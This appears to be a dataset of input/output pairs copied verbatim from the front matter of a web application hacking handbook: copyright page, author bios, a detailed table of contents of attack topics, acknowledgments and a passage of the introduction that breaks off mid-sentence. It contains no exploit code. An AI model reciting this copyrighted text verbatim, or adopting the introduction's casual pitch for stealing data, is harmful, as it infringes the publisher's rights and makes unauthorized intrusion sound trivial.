[
  {
    "input": "The Web Application Hacker’s Handbook",
    "output": "70779ffirs.qxd:WileyRed 9/17/07 12:11 PM Page i\nThe Web Application\nHacker’s Handbook\nDiscovering and Exploiting Security Flaws\nDafydd Stuttard\nMarcus Pinto\nWiley Publishing, Inc.\n70779ffirs.qxd:WileyRed 9/17/07 12:11 PM Page ii\nThe Web Application Hacker’s Handbook: Discovering and Exploiting Security Flaws\nPublished by\nWiley Publishing, Inc.\n10475 Crosspoint Boulevard\nIndianapolis, IN 46256\nwww.wiley.com\nCopyright © 2008 by Dafydd Stuttard and Marcus Pinto.\nPublished by Wiley Publishing, Inc., Indianapolis, Indiana\nPublished simultaneously in Canada\nISBN: 978-0-470-17077-9\nManufactured in the United States of America\n10 9 8 7 6 5 4 3 2 1\nNo part of this publication may be reproduced, stored in a retrieval system or transmitted in any form\nor by any means, electronic, mechanical, photocopying, recording, scanning or otherwise, except as\npermitted under Sections 107 or 108 of the 1976 United States Copyright Act, without either the prior\nwritten permission of the Publisher, or authorization through payment of the appropriate per-copy fee\nto the Copyright Clearance Center, 222 Rosewood Drive, Danvers, MA 01923, (978) 750-8400, fax (978)\n646-8600. Requests to the Publisher for permission should be addressed to the Legal Department, Wiley\nPublishing, Inc., 10475 Crosspoint Blvd., Indianapolis, IN 46256, (317) 572-3447, fax (317) 572-4355, or\nonline at http://www.wiley.com/go/permissions.\nLimit of Liability/Disclaimer of Warranty:The publisher and the author make no representations or\nwarranties with respect to the accuracy or completeness of the contents of this work and specifically\ndisclaim all warranties, including without limitation warranties of fitness for a particular purpose. No\nwarranty may be created or extended by sales or promotional materials. The advice and strategies con-\ntained herein may not be suitable for every situation. This work is sold with the understanding that the\npublisher is not engaged in rendering legal, accounting, or other professional services. If professional\nassistance is required, the services of a competent professional person should be sought. Neither the\npublisher nor the author shall be liable for damages arising herefrom. The fact that an organization or\nWebsite is referred to in this work as a citation and/or a potential source of further information does\nnot mean that the author or the publisher endorses the information the organization or Website may\nprovide or recommendations it may make. Further, readers should be aware that Internet Websites\nlisted in this work may have changed or disappeared between when this work was written and when\nit is read.\nFor general information on our other products and services or to obtain technical support, please con-\ntact our Customer Care Department within the U.S. at (800) 762-2974, outside the U.S. at (317) 572-3993\nor fax (317) 572-4002.\nLibrary of Congress Cataloging-in-Publication Data\nStuttard, Dafydd, 1972-\nThe web application hacker's handbook : discovering and exploiting security flaws / Dafydd Stut-\ntard, Marcus Pinto.\np. cm.\nIncludes index.\nISBN 978-0-470-17077-9 (pbk.)\n1. Internet--Security measures. 2. Computer security. I. Pinto, Marcus, 1978- II. Title.\nTK5105.875.I57S85 2008\n005.8--dc22\n2007029983\nTrademarks:Wiley and related trade dress are registered trademarks of Wiley Publishing, Inc., in the\nUnited States and other countries, and may not be used without written permission. All other trade-\nmarks are the property of their respective owners. Wiley Publishing, Inc., is not associated with any\nproduct or vendor mentioned in this book.\nWiley also publishes its books in a variety of electronic formats. Some content that appears in print may\nnot be available in electronic books."
  },
  {
    "input": "About the Authors",
    "output": "70779ffirs.qxd:WileyRed 9/17/07 12:11 PM Page iii\nAbout the Authors\nDafydd Stuttard is a Principal Security Consultant at Next Generation Secu-\nrity Software, where he leads the web application security competency. He has\nnine years’ experience in security consulting and specializes in the penetration\ntesting of web applications and compiled software.\nDafydd has worked with numerous banks, retailers, and other enterprises\nto help secure their web applications, and has provided security consulting to\nseveral software manufacturers and governments to help secure their com-\npiled software. Dafydd is an accomplished programmer in several languages,\nand his interests include developing tools to facilitate all kinds of software\nsecurity testing.\nDafydd has developed and presented training courses at the Black Hat secu-\nrity conferences around the world. Under the alias “PortSwigger,” Dafydd cre-\nated the popular Burp Suite of web application hacking tools. Dafydd holds\nmaster’s and doctorate degrees in philosophy from the University of Oxford.\nMarcus Pinto is a Principal Security Consultant at Next Generation Security\nSoftware, where he leads the database competency development team, and\nhas lead the development of NGS’ primary training courses. He has eight\nyears’ experience in security consulting and specializes in penetration testing\nof web applications and supporting architectures.\nMarcus has worked with numerous banks, retailers, and other enterprises to\nhelp secure their web applications, and has provided security consulting to the\ndevelopment projects of several security-critical applications. He has worked\nextensively with large-scale web application deployments in the financial ser-\nvices industry.\nMarcus has developed and presented database and web application train-\ning courses at the Black Hat and other security conferences around the world.\nMarcus holds a master’s degree in physics from the University of Cambridge.\niii"
  },
  {
    "input": "Credits",
    "output": "70779ffirs.qxd:WileyRed 9/17/07 12:11 PM Page iv\nCredits\nExecutive Editor Vice President and Executive Publisher\nCarol Long Joseph B. Wikert\nDevelopment Editor Project Coordinator, Cover\nAdaobi Obi Tulton Lynsey Osborn\nProduction Editor Compositor\nChristine O’Connor Happenstance Type-O-Rama\nCopy Editor Proofreader\nFoxxe Editorial Services Kathryn Duggan\nEditorial Manager Indexer\nMary Beth Wakefield Johnna VanHoose Dinse\nProduction Manager Anniversary Logo Design\nTim Tate Richard Pacifico\nVice President and Executive Group\nPublisher\nRichard Swadley\niv"
  },
  {
    "input": "Contents",
    "output": "70779toc.qxd:WileyRed 9/16/07 5:07 PM Page v\nContents\nAcknowledgments xxiii\nIntroduction xxv\nChapter 1 Web Application (In)security 1\nThe Evolution of Web Applications 2\nCommon Web Application Functions 3\nBenefits of Web Applications 4\nWeb Application Security 5\n“This Site Is Secure” 6\nThe Core Security Problem: Users Can Submit Arbitrary Input 8\nKey Problem Factors 9\nImmature Security Awareness 9\nIn-House Development 9\nDeceptive Simplicity 9\nRapidly Evolving Threat Profile 10\nResource and Time Constraints 10\nOverextended Technologies 10\nThe New Security Perimeter 10\nThe Future of Web Application Security 12\nChapter Summary 13\nChapter 2 Core Defense Mechanisms 15\nHandling User Access 16\nAuthentication 16\nSession Management 17\nAccess Control 18\nHandling User Input 19\nVarieties of Input 20\nApproaches to Input Handling 21\nv\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page vi\nvi Contents\n“Reject Known Bad” 21\n“Accept Known Good” 21\nSanitization 22\nSafe Data Handling 22\nSemantic Checks 23\nBoundary Validation 23\nMultistep Validation and Canonicalization 26\nHandling Attackers 27\nHandling Errors 27\nMaintaining Audit Logs 29\nAlerting Administrators 30\nReacting to Attacks 31\nManaging the Application 32\nChapter Summary 33\nQuestions 34\nChapter 3 Web Application Technologies 35\nThe HTTP Protocol 35\nHTTP Requests 36\nHTTP Responses 37\nHTTP Methods 38\nURLs 40\nHTTP Headers 41\nGeneral Headers 41\nRequest Headers 41\nResponse Headers 42\nCookies 43\nStatus Codes 44\nHTTPS 45\nHTTP Proxies 46\nHTTP Authentication 47\nWeb Functionality 47\nServer-Side Functionality 48\nThe Java Platform 49\nASP.NET 50\nPHP 50\nClient-Side Functionality 51\nHTML 51\nHyperlinks 51\nForms 52\nJavaScript 54\nThick Client Components 54\nState and Sessions 55\nEncoding Schemes 56\nURL Encoding 56\nUnicode Encoding 57\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page vii\nContents vii\nHTML Encoding 57\nBase64 Encoding 58\nHex Encoding 59\nNext Steps 59\nQuestions 59\nChapter 4 Mapping the Application 61\nEnumerating Content and Functionality 62\nWeb Spidering 62\nUser-Directed Spidering 65\nDiscovering Hidden Content 67\nBrute-Force Techniques 67\nInference from Published Content 70\nUse of Public Information 72\nLeveraging the Web Server 75\nApplication Pages vs. Functional Paths 76\nDiscovering Hidden Parameters 79\nAnalyzing the Application 79\nIdentifying Entry Points for User Input 80\nIdentifying Server-Side Technologies 82\nBanner Grabbing 82\nHTTP Fingerprinting 82\nFile Extensions 84\nDirectory Names 86\nSession Tokens 86\nThird-Party Code Components 87\nIdentifying Server-Side Functionality 88\nDissecting Requests 88\nExtrapolating Application Behavior 90\nMapping the Attack Surface 91\nChapter Summary 92\nQuestions 93\nChapter 5 Bypassing Client-Side Controls 95\nTransmitting Data via the Client 95\nHidden Form Fields 96\nHTTP Cookies 99\nURL Parameters 99\nThe Referer Header 100\nOpaque Data 101\nThe ASP.NET ViewState 102\nCapturing User Data: HTML Forms 106\nLength Limits 106\nScript-Based Validation 108\nDisabled Elements 110\nCapturing User Data: Thick-Client Components 111\nJava Applets 112\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page viii\nviii Contents\nDecompiling Java Bytecode 114\nCoping with Bytecode Obfuscation 117\nActiveX Controls 119\nReverse Engineering 120\nManipulating Exported Functions 122\nFixing Inputs Processed by Controls 123\nDecompiling Managed Code 124\nShockwave Flash Objects 124\nHandling Client-Side Data Securely 128\nTransmitting Data via the Client 128\nValidating Client-Generated Data 129\nLogging and Alerting 131\nChapter Summary 131\nQuestions 132\nChapter 6 Attacking Authentication 133\nAuthentication Technologies 134\nDesign Flaws in Authentication Mechanisms 135\nBad Passwords 135\nBrute-Forcible Login 136\nVerbose Failure Messages 139\nVulnerable Transmission of Credentials 142\nPassword Change Functionality 144\nForgotten Password Functionality 145\n“Remember Me” Functionality 148\nUser Impersonation Functionality 149\nIncomplete Validation of Credentials 152\nNon-Unique Usernames 152\nPredictable Usernames 154\nPredictable Initial Passwords 154\nInsecure Distribution of Credentials 155\nImplementation Flaws in Authentication 156\nFail-Open Login Mechanisms 156\nDefects in Multistage Login Mechanisms 157\nInsecure Storage of Credentials 161\nSecuring Authentication 162\nUse Strong Credentials 162\nHandle Credentials Secretively 163\nValidate Credentials Properly 164\nPrevent Information Leakage 166\nPrevent Brute-Force Attacks 167\nPrevent Misuse of the Password Change Function 170\nPrevent Misuse of the Account Recovery Function 170\nLog, Monitor, and Notify 172\nChapter Summary 172\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page ix\nContents ix\nChapter 7 Attacking Session Management 175\nThe Need for State 176\nAlternatives to Sessions 178\nWeaknesses in Session Token Generation 180\nMeaningful Tokens 180\nPredictable Tokens 182\nConcealed Sequences 184\nTime Dependency 185\nWeak Random Number Generation 187\nWeaknesses in Session Token Handling 191\nDisclosure of Tokens on the Network 192\nDisclosure of Tokens in Logs 196\nVulnerable Mapping of Tokens to Sessions 198\nVulnerable Session Termination 200\nClient Exposure to Token Hijacking 201\nLiberal Cookie Scope 203\nCookie Domain Restrictions 203\nCookie Path Restrictions 205\nSecuring Session Management 206\nGenerate Strong Tokens 206\nProtect Tokens throughout Their Lifecycle 208\nPer-Page Tokens 211\nLog, Monitor, and Alert 212\nReactive Session Termination 212\nChapter Summary 213\nQuestions 214\nChapter 8 Attacking Access Controls 217\nCommon Vulnerabilities 218\nCompletely Unprotected Functionality 219\nIdentifier-Based Functions 220\nMultistage Functions 222\nStatic Files 222\nInsecure Access Control Methods 223\nAttacking Access Controls 224\nSecuring Access Controls 228\nA Multi-Layered Privilege Model 231\nChapter Summary 234\nQuestions 235\nChapter 9 Injecting Code 237\nInjecting into Interpreted Languages 238\nInjecting into SQL 240\nExploiting a Basic Vulnerability 241\nBypassing a Login 243\nFinding SQL Injection Bugs 244\nInjecting into Different Statement Types 247\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page x\nx Contents\nThe UNION Operator 251\nFingerprinting the Database 255\nExtracting Useful Data 256\nAn Oracle Hack 257\nAn MS-SQL Hack 260\nExploiting ODBC Error Messages (MS-SQL Only) 262\nEnumerating Table and Column Names 263\nExtracting Arbitrary Data 265\nUsing Recursion 266\nBypassing Filters 267\nSecond-Order SQL Injection 271\nAdvanced Exploitation 272\nRetrieving Data as Numbers 273\nUsing an Out-of-Band Channel 274\nUsing Inference: Conditional Responses 277\nBeyond SQL Injection: Escalating the Database Attack 285\nMS-SQL 286\nOracle 288\nMySQL 288\nSQL Syntax and Error Reference 289\nSQL Syntax 290\nSQL Error Messages 292\nPreventing SQL Injection 296\nPartially Effective Measures 296\nParameterized Queries 297\nDefense in Depth 299\nInjecting OS Commands 300\nExample 1: Injecting via Perl 300\nExample 2: Injecting via ASP 302\nFinding OS Command Injection Flaws 304\nPreventing OS Command Injection 307\nInjecting into Web Scripting Languages 307\nDynamic Execution Vulnerabilities 307\nDynamic Execution in PHP 308\nDynamic Execution in ASP 308\nFinding Dynamic Execution Vulnerabilities 309\nFile Inclusion Vulnerabilities 310\nRemote File Inclusion 310\nLocal File Inclusion 311\nFinding File Inclusion Vulnerabilities 312\nPreventing Script Injection Vulnerabilities 312\nInjecting into SOAP 313\nFinding and Exploiting SOAP Injection 315\nPreventing SOAP Injection 316\nInjecting into XPath 316\nSubverting Application Logic 317\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page xi\nContents xi\nInformed XPath Injection 318\nBlind XPath Injection 319\nFinding XPath Injection Flaws 320\nPreventing XPath Injection 321\nInjecting into SMTP 321\nEmail Header Manipulation 322\nSMTP Command Injection 323\nFinding SMTP Injection Flaws 324\nPreventing SMTP Injection 326\nInjecting into LDAP 326\nInjecting Query Attributes 327\nModifying the Search Filter 328\nFinding LDAP Injection Flaws 329\nPreventing LDAP Injection 330\nChapter Summary 331\nQuestions 331\nChapter 10 Exploiting Path Traversal 333\nCommon Vulnerabilities 333\nFinding and Exploiting Path Traversal Vulnerabilities 335\nLocating Targets for Attack 335\nDetecting Path Traversal Vulnerabilities 336\nCircumventing Obstacles to Traversal Attacks 339\nCoping with Custom Encoding 342\nExploiting Traversal Vulnerabilities 344\nPreventing Path Traversal Vulnerabilities 344\nChapter Summary 346\nQuestions 346\nChapter 11 Attacking Application Logic 349\nThe Nature of Logic Flaws 350\nReal-World Logic Flaws 350\nExample 1: Fooling a Password Change Function 351\nThe Functionality 351\nThe Assumption 351\nThe Attack 352\nExample 2: Proceeding to Checkout 352\nThe Functionality 352\nThe Assumption 353\nThe Attack 353\nExample 3: Rolling Your Own Insurance 354\nThe Functionality 354\nThe Assumption 354\nThe Attack 355\nExample 4: Breaking the Bank 356\nThe Functionality 356\nThe Assumption 357\nThe Attack 358\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page xii\nxii Contents\nExample 5: Erasing an Audit Trail 359\nThe Functionality 359\nThe Assumption 359\nThe Attack 359\nExample 6: Beating a Business Limit 360\nThe Functionality 360\nThe Assumption 361\nThe Attack 361\nExample 7: Cheating on Bulk Discounts 362\nThe Functionality 362\nThe Assumption 362\nThe Attack 362\nExample 8: Escaping from Escaping 363\nThe Functionality 363\nThe Assumption 364\nThe Attack 364\nExample 9: Abusing a Search Function 365\nThe Functionality 365\nThe Assumption 365\nThe Attack 365\nExample 10: Snarfing Debug Messages 366\nThe Functionality 366\nThe Assumption 367\nThe Attack 367\nExample 11: Racing against the Login 368\nThe Functionality 368\nThe Assumption 368\nThe Attack 368\nAvoiding Logic Flaws 370\nChapter Summary 372\nQuestions 372\nChapter 12 Attacking Other Users 375\nCross-Site Scripting 376\nReflected XSS Vulnerabilities 377\nExploiting the Vulnerability 379\nStored XSS Vulnerabilities 383\nStoring XSS in Uploaded Files 385\nDOM-Based XSS Vulnerabilities 386\nReal-World XSS Attacks 388\nChaining XSS and Other Attacks 390\nPayloads for XSS Attacks 391\nVirtual Defacement 391\nInjecting Trojan Functionality 392\nInducing User Actions 394\nExploiting Any Trust Relationships 394\nEscalating the Client-Side Attack 396\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page xiii\nContents xiii\nDelivery Mechanisms for XSS Attacks 399\nDelivering Reflected and DOM-Based XSS Attacks 399\nDelivering Stored XSS Attacks 400\nFinding and Exploiting XSS Vulnerabilities 401\nFinding and Exploiting Reflected XSS Vulnerabilities 402\nFinding and Exploiting Stored XSS Vulnerabilities 415\nFinding and Exploiting DOM-Based XSS Vulnerabilities 417\nHttpOnly Cookies and Cross-Site Tracing 421\nPreventing XSS Attacks 423\nPreventing Reflected and Stored XSS 423\nPreventing DOM-Based XSS 427\nPreventing XST 428\nRedirection Attacks 428\nFinding and Exploiting Redirection Vulnerabilities 429\nCircumventing Obstacles to Attack 431\nPreventing Redirection Vulnerabilities 433\nHTTP Header Injection 434\nExploiting Header Injection Vulnerabilities 434\nInjecting Cookies 435\nDelivering Other Attacks 436\nHTTP Response Splitting 436\nPreventing Header Injection Vulnerabilities 438\nFrame Injection 438\nExploiting Frame Injection 439\nPreventing Frame Injection 440\nRequest Forgery 440\nOn-Site Request Forgery 441\nCross-Site Request Forgery 442\nExploiting XSRF Flaws 443\nPreventing XSRF Flaws 444\nJSON Hijacking 446\nJSON 446\nAttacks against JSON 447\nOverriding the Array Constructor 447\nImplementing a Callback Function 448\nFinding JSON Hijacking Vulnerabilities 449\nPreventing JSON Hijacking 450\nSession Fixation 450\nFinding and Exploiting Session Fixation Vulnerabilities 452\nPreventing Session Fixation Vulnerabilities 453\nAttacking ActiveX Controls 454\nFinding ActiveX Vulnerabilities 455\nPreventing ActiveX Vulnerabilities 456\nLocal Privacy Attacks 458\nPersistent Cookies 458\nCached Web Content 458\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page xiv\nxiv Contents\nBrowsing History 459\nAutocomplete 460\nPreventing Local Privacy Attacks 460\nAdvanced Exploitation Techniques 461\nLeveraging Ajax 461\nMaking Asynchronous Off-Site Requests 463\nAnti-DNS Pinning 464\nA Hypothetical Attack 465\nDNS Pinning 466\nAttacks against DNS Pinning 466\nBrowser Exploitation Frameworks 467\nChapter Summary 469\nQuestions 469\nChapter 13 Automating Bespoke Attacks 471\nUses for Bespoke Automation 472\nEnumerating Valid Identifiers 473\nThe Basic Approach 474\nDetecting Hits 474\nHTTP Status Code 474\nResponse Length 475\nResponse Body 475\nLocation Header 475\nSet-cookie Header 475\nTime Delays 476\nScripting the Attack 476\nJAttack 477\nHarvesting Useful Data 484\nFuzzing for Common Vulnerabilities 487\nPutting It All Together: Burp Intruder 491\nPositioning Payloads 492\nChoosing Payloads 493\nConfiguring Response Analysis 494\nAttack 1: Enumerating Identifiers 495\nAttack 2: Harvesting Information 498\nAttack 3: Application Fuzzing 500\nChapter Summary 502\nQuestions 502\nChapter 14 Exploiting Information Disclosure 505\nExploiting Error Messages 505\nScript Error Messages 506\nStack Traces 507\nInformative Debug Messages 508\nServer and Database Messages 509\nUsing Public Information 511\nEngineering Informative Error Messages 512\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page xv\nContents xv\nGathering Published Information 513\nUsing Inference 514\nPreventing Information Leakage 516\nUse Generic Error Messages 516\nProtect Sensitive Information 517\nMinimize Client-Side Information Leakage 517\nChapter Summary 518\nQuestions 518\nChapter 15 Attacking Compiled Applications 521\nBuffer Overflow Vulnerabilities 522\nStack Overflows 522\nHeap Overflows 523\n“Off-by-One” Vulnerabilities 524\nDetecting Buffer Overflow Vulnerabilities 527\nInteger Vulnerabilities 529\nInteger Overflows 529\nSignedness Errors 529\nDetecting Integer Vulnerabilities 530\nFormat String Vulnerabilities 531\nDetecting Format String Vulnerabilities 532\nChapter Summary 533\nQuestions 534\nChapter 16 Attacking Application Architecture 535\nTiered Architectures 535\nAttacking Tiered Architectures 536\nExploiting Trust Relationships between Tiers 537\nSubverting Other Tiers 538\nAttacking Other Tiers 539\nSecuring Tiered Architectures 540\nMinimize Trust Relationships 540\nSegregate Different Components 541\nApply Defense in Depth 542\nShared Hosting and Application Service Providers 542\nVirtual Hosting 543\nShared Application Services 543\nAttacking Shared Environments 544\nAttacks against Access Mechanisms 545\nAttacks between Applications 546\nSecuring Shared Environments 549\nSecure Customer Access 549\nSegregate Customer Functionality 550\nSegregate Components in a Shared Application 551\nChapter Summary 551\nQuestions 551\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page xvi\nxvi Contents\nChapter 17 Attacking the Web Server 553\nVulnerable Web Server Configuration 553\nDefault Credentials 554\nDefault Content 555\nDebug Functionality 555\nSample Functionality 556\nPowerful Functions 557\nDirectory Listings 559\nDangerous HTTP Methods 560\nThe Web Server as a Proxy 562\nMisconfigured Virtual Hosting 564\nSecuring Web Server Configuration 565\nVulnerable Web Server Software 566\nBuffer Overflow Vulnerabilities 566\nMicrosoft IIS ISAPI Extensions 567\nApache Chunked Encoding Overflow 567\nMicrosoft IIS WebDav Overflow 567\niPlanet Search Overflow 567\nPath Traversal Vulnerabilities 568\nAccipiter DirectServer 568\nAlibaba 568\nCisco ACS Acme.server 568\nMcAfee EPolicy Orcestrator 568\nEncoding and Canonicalization Vulnerabilities 568\nAllaire JRun Directory Listing Vulnerability 569\nMicrosoft IIS Unicode Path Traversal Vulnerabilities 569\nOracle PL/SQL Exclusion List Bypasses 570\nFinding Web Server Flaws 571\nSecuring Web Server Software 572\nChoose Software with a Good Track Record 572\nApply Vendor Patches 572\nPerform Security Hardening 573\nMonitor for New Vulnerabilities 573\nUse Defense-in-Depth 573\nChapter Summary 574\nQuestions 574\nChapter 18 Finding Vulnerabilities in Source Code 577\nApproaches to Code Review 578\nBlack-Box vs. White-Box Testing 578\nCode Review Methodology 579\nSignatures of Common Vulnerabilities 580\nCross-Site Scripting 580\nSQL Injection 581\nPath Traversal 582\nArbitrary Redirection 583\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page xvii\nContents xvii\nOS Command Injection 584\nBackdoor Passwords 584\nNative Software Bugs 585\nBuffer Overflow Vulnerabilities 585\nInteger Vulnerabilities 586\nFormat String Vulnerabilities 586\nSource Code Comments 586\nThe Java Platform 587\nIdentifying User-Supplied Data 587\nSession Interaction 589\nPotentially Dangerous APIs 589\nFile Access 589\nDatabase Access 590\nDynamic Code Execution 591\nOS Command Execution 591\nURL Redirection 592\nSockets 592\nConfiguring the Java Environment 593\nASP.NET 594\nIdentifying User-Supplied Data 594\nSession Interaction 595\nPotentially Dangerous APIs 596\nFile Access 596\nDatabase Access 597\nDynamic Code Execution 598\nOS Command Execution 598\nURL Redirection 599\nSockets 600\nConfiguring the ASP.NET Environment 600\nPHP 601\nIdentifying User-Supplied Data 601\nSession Interaction 603\nPotentially Dangerous APIs 604\nFile Access 604\nDatabase Access 606\nDynamic Code Execution 607\nOS Command Execution 607\nURL Redirection 608\nSockets 608\nConfiguring the PHP Environment 609\nRegister Globals 609\nSafe Mode 610\nMagic Quotes 610\nMiscellaneous 611\nPerl 611\nIdentifying User-Supplied Data 612\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page xviii\nxviii Contents\nSession Interaction 613\nPotentially Dangerous APIs 613\nFile Access 613\nDatabase Access 613\nDynamic Code Execution 614\nOS Command Execution 614\nURL Redirection 615\nSockets 615\nConfiguring the Perl Environment 615\nJavaScript 616\nDatabase Code Components 617\nSQL Injection 617\nCalls to Dangerous Functions 618\nTools for Code Browsing 619\nChapter Summary 620\nQuestions 621\nChapter 19 A Web Application Hacker’s Toolkit 623\nWeb Browsers 624\nInternet Explorer 624\nFirefox 624\nOpera 626\nIntegrated Testing Suites 627\nHow the Tools Work 628\nIntercepting Proxies 628\nWeb Application Spiders 633\nApplication Fuzzers and Scanners 636\nManual Request Tools 637\nFeature Comparison 640\nBurp Suite 643\nParos 644\nWebScarab 645\nAlternatives to the Intercepting Proxy 646\nTamper Data 647\nTamperIE 647\nVulnerability Scanners 649\nVulnerabilities Detected by Scanners 649\nInherent Limitations of Scanners 651\nEvery Web Application Is Different 652\nScanners Operate on Syntax 652\nScanners Do Not Improvise 652\nScanners Are Not Intuitive 653\nTechnical Challenges Faced by Scanners 653\nAuthentication and Session Handling 653\nDangerous Effects 654\nIndividuating Functionality 655\nOther Challenges to Automation 655\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page xix\nContents xix\nCurrent Products 656\nUsing a Vulnerability Scanner 658\nOther Tools 659\nNikto 660\nHydra 660\nCustom Scripts 661\nWget 662\nCurl 662\nNetcat 663\nStunnel 663\nChapter Summary 664\nChapter 20 A Web Application Hacker’s Methodology 665\nGeneral Guidelines 667\n1. Map the Application’s Content 669\n1.1. Explore Visible Content 669\n1.2. Consult Public Resources 670\n1.3. Discover Hidden Content 670\n1.4. Discover Default Content 671\n1.5. Enumerate Identifier-Specified Functions 671\n1.6. Test for Debug Parameters 672\n2. Analyze the Application 672\n2.1. Identify Functionality 673\n2.2. Identify Data Entry Points 673\n2.3. Identify the Technologies Used 673\n2.4. Map the Attack Surface 674\n3. Test Client-Side Controls 675\n3.1. Test Transmission of Data via the Client 675\n3.2. Test Client-Side Controls over User Input 676\n3.3. Test Thick-Client Components 677\n3.3.1. Test Java Applets 677\n3.3.2. Test ActiveX controls 678\n3.3.3. Test Shockwave Flash objects 678\n4. Test the Authentication Mechanism 679\n4.1. Understand the Mechanism 680\n4.2. Test Password Quality 680\n4.3. Test for Username Enumeration 680\n4.4. Test Resilience to Password Guessing 681\n4.5. Test Any Account Recovery Function 682\n4.6. Test Any Remember Me Function 682\n4.7. Test Any Impersonation Function 683\n4.8. Test Username Uniqueness 683\n4.9. Test Predictability of Auto-Generated Credentials 684\n4.10. Check for Unsafe Transmission of Credentials 684\n4.11. Check for Unsafe Distribution of Credentials 685\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page xx\nxx Contents\n4.12. Test for Logic Flaws 685\n4.12.1. Test for Fail-Open Conditions 685\n4.12.2. Test Any Multistage Mechanisms 686\n4.13. Exploit Any Vulnerabilities to Gain Unauthorized Access 687\n5. Test the Session Management Mechanism 688\n5.1. Understand the Mechanism 689\n5.2. Test Tokens for Meaning 689\n5.3. Test Tokens for Predictability 690\n5.4. Check for Insecure Transmission of Tokens 691\n5.5. Check for Disclosure of Tokens in Logs 692\n5.6. Check Mapping of Tokens to Sessions 692\n5.7. Test Session Termination 693\n5.8. Check for Session Fixation 694\n5.9. Check for XSRF 694\n5.10. Check Cookie Scope 695\n6. Test Access Controls 696\n6.1. Understand the Access Control Requirements 696\n6.2. Testing with Multiple Accounts 697\n6.3. Testing with Limited Access 697\n6.4. Test for Insecure Access Control Methods 698\n7. Test for Input-Based Vulnerabilities 699\n7.1. Fuzz All Request Parameters 699\n7.2. Test for SQL Injection 702\n7.3. Test for XSS and Other Response Injection 704\n7.3.1. Identify Reflected Request Parameters 704\n7.3.2. Test for Reflected XSS 705\n7.3.3. Test for HTTP Header Injection 705\n7.3.4. Test for Arbitrary Redirection 706\n7.3.5. Test for Stored Attacks 706\n7.4. Test for OS Command Injection 707\n7.5. Test for Path Traversal 709\n7.6. Test for Script Injection 711\n7.7. Test for File Inclusion 711\n8. Test for Function-Specific Input Vulnerabilities 712\n8.1. Test for SMTP Injection 712\n8.2. Test for Native Software Vulnerabilities 713\n8.2.1. Test for Buffer Overflows 713\n8.2.2. Test for Integer Vulnerabilities 714\n8.2.3. Test for Format String Vulnerabilities 714\n8.3. Test for SOAP Injection 715\n8.4. Test for LDAP Injection 715\n8.5. Test for XPath Injection 716\n9. Test for Logic Flaws 717\n9.1. Identify the Key Attack Surface 717\n9.2. Test Multistage Processes 718\n9.3. Test Handling of Incomplete Input 718\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page xxi\nContents xxi\n9.4. Test Trust Boundaries 719\n9.5. Test Transaction Logic 719\n10. Test for Shared Hosting Vulnerabilities 720\n10.1. Test Segregation in Shared Infrastructures 720\n10.2. Test Segregation between ASP-Hosted Applications 721\n11. Test for Web Server Vulnerabilities 721\n11.1. Test for Default Credentials 722\n11.2. Test for Default Content 722\n11.3. Test for Dangerous HTTP Methods 722\n11.4. Test for Proxy Functionality 723\n11.5. Test for Virtual Hosting Misconfiguration 723\n11.6. Test for Web Server Software Bugs 723\n12. Miscellaneous Checks 724\n12.1. Check for DOM-Based Attacks 724\n12.2. Check for Frame Injection 725\n12.3. Check for Local Privacy Vulnerabilities 726\n12.4. Follow Up Any Information Leakage 726\n12.5. Check for Weak SSL Ciphers 727\nIndex 729\n70779toc.qxd:WileyRed 9/16/07 5:07 PM Page xxii"
  },
  {
    "input": "Acknowledgments",
    "output": "70779flast.qxd:WileyRed 9/14/07 3:12 PM Page xxiii\nAcknowledgments\nOur primary debt is to the directors and our other colleagues at Next Genera-\ntion Security Software, who have provided a creative working environment,\npromoted sharing of knowledge, and supported us during the months spent\nproducing this book. In particular, we received direct assistance from Chris\nAnley, Dave Armstrong, Dominic Beecher, David Litchfield, Adam Matthews,\nDave Spencer, and Peter Winter-Smith.\nIn addition to our immediate colleagues, we are greatly indebted to the\nwider community of researchers who have shared their ideas and contributed\nto the collective understanding of web application security issues that exists\ntoday. Because this is a practical handbook rather than a work of scholarship,\nwe deliberately avoided filling it with a thousand citations of influential arti-\ncles, books, and blog postings which spawned the ideas involved. We hope\nthat people whose work we discuss anonymously are content with the general\ncredit given here.\nWe are grateful to the people at Wiley, in particular to Carol Long for enthusi-\nastically supporting our project from the outset, to Adaobi Obi Tulton for helping\nto polish our manuscript and coaching us in the quirks of “American English,”\nand to Christine O’Connor’s team for delivering a first-rate production.\nA large measure of thanks is due to our respective partners, Becky and\nSusan, for tolerating the significant distraction and time involved in producing\na book of this size.\nBoth authors are indebted to the people who led us into our unusual line of\nwork. Dafydd would like to thank Martin Law. Martin is a great guy who first\ntaught me how to hack, and encouraged me to spend my time developing tech-\nniques and tools for attacking applications. Marcus would like to thank his par-\nents for a great many things, a significant one being getting me into computers.\nI’ve been getting into computers ever since.\nxxiii\n70779flast.qxd:WileyRed 9/14/07 3:12 PM Page xxiv"
  },
  {
    "input": "Overview of This Book",
    "output": "70779flast.qxd:WileyRed 9/14/07 3:12 PM Page xxv\nIntroduction\nThis book is a practical guide to discovering and exploiting security flaws in\nweb applications. By “web application” we mean an application that is accessed\nby using a web browser to communicate with a web server. We examine a wide\nvariety of different technologies, such as databases, file systems, and web ser-\nvices, but only in the context in which these are employed by web applications.\nIf you want to learn how to run port scans, attack firewalls, or break into\nservers in other ways, we suggest you look elsewhere. But if you want to know\nhow to hack into a web application, steal sensitive data, and perform unau-\nthorized actions, then this is the book for you. There is enough that is interest-\ning and fun to say on that subject without straying into any other territory.\nOverview of This Book\nThe focus of this book is highly practical. While we include sufficient back-\nground and theory for you to understand the vulnerabilities that web applica-\ntions contain, our primary concern is with the tasks and techniques that you\nneed to master in order to break into them. Throughout the book, we spell out\nthe 